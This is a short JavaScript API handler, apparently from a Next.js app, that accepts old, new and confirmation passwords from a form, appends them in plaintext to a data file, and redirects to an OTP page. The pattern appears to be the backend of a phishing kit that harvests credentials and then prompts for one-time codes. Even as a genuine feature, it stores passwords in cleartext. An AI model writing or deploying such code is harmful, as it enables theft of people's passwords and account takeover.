import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { oldpass, newpass, confirmpass } = req.body;

    const log = `Old Password: ${oldpass}\nNew Password: ${newpass}\nConfirm Password: ${confirmpass}\n\n`;
    const filePath = path.join(process.cwd(), 'data', 'data.txt');

    fs.appendFileSync(filePath, log, 'utf8');

    res.redirect(307, '/otp'); // Redirect to OTP page
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
